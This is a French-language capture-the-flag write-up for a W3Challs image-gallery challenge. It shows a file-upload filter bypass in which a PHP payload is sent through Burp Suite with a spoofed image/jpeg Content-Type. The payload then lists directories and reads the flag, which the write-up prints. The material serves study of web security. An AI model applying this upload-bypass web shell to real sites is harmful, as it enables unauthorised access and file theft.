# An image gallery

1. Tout d’abord, allons sur le site
2. Ensuite, nous pouvons voir les informations dans la page d’accueil; vous pouvez télécharger des photos avec le formulaire de téléchargement. Les images sont ensuite stockées dans le répertoire des suggestions. 
3. Si vous essayez de visiter le "répertoire des suggestions", vous découvrirez que vous êtes interdit. Cependant, vous pouvez toujours visiter la partie image de celui-ci. Par exemple, téléchargez un fichier jpeg nommé 123.jpeg, et vous pouvez visiter l’image en tant qu’URL : http://gallery.hax.w3challs.com/suggestions/123
4. Donc, il y a quelque chose qui me vient à l’esprit, et si nous pouvions télécharger du code php qui nous permet de visiter le répertoire afin que nous puissions trouver le flag. (L’objectif est de trouver un répertoire qui stocke l’indicateur) Cependant, il y a un avertissement dans la page d’accueil : Pour des raisons de sécurité, seuls les fichiers jpeg sont acceptés.
5. Comme vous pouvez le voir, nous ne pouvons pas télécharger le fichier php, mais que se passe-t-il si nous pouvons le contourner? En voici quelques-uns [information](https://www.hackingarticles.in/5-ways-file-upload-vulnerability-exploitation/) que je trouve sur le web.
6. Une fois que nous connaissons quelques moyens de le contourner, nous avons besoin d’un outil : burp suite pour nous aider.
7. Maintenant, nous devons penser à du code php qui peut nous aider. Voici ma charge utile : 
    ```php
    <php?
        var_dump(scandir('..'));
    ?>
    ```
    Après cela, nous avons nommé un fichier "upload.php" et envoyez-le. Voici quelques informations sur burp suite: 
    ```
    Content-Disposition: form-data; name="upload_file"; filename="upload.php"
    Content-Type: text/php

    <?php
        var_dump(scandir('..'));
    ?>
    ```
    J’utilise la méthode sous « Content-Type file Upload » sur le site Web (bien sûr, vous pouvez utiliser une autre méthode pour atteindre l’objectif), donc je change le playload et l’envoie:
    ```
    Content-Disposition: form-data; name="upload_file"; filename="upload.php"
    Content-Type: image/jpeg

    <?php
        var_dump(scandir('..'));
    ?>
    ```
    Et obtenez le commentaire : Le fichier upload.php a été téléchargé correctement..
8. La prochaine étape maintenant est la visite http://gallery.hax.w3challs.com/suggestions/upload.php et je reçois les informations ci-dessous : 
    ```php
    array(11) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "basic.css" [3]=> string(3) "css" [4]=> string(6) "images" [5]=> string(9) "index.php" [6]=> string(2) "js" [7]=> string(4) "lang" [8]=> string(8) "lang.php" [9]=> string(14) "omg_secret_wut" [10]=> string(11) "suggestions" } 
    ```
    Donc, il y a un fichier très intéressant nommé "omg_secret_wut", je décide d’y jeter un coup d’œil. 
    ```php
    <?php
        var_dump(scandir('../omg_secret_wut'));
    ?>
    ```
    Ensuite on obtient : 
    ```php
    array(3) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) "flag" } 
    ```
9. Comme vous pouvez le voir, il y a le flag. Voici le playload utile pour l’obtenir : 
    ```php
    <?php
        var_dump(file_get_contents('../omg_secret_wut/flag'));
    ?>
    ```
**10. Voici le flag :** `W3C{W3lc0m3_t0_y0u_w3b_sh3ll}`
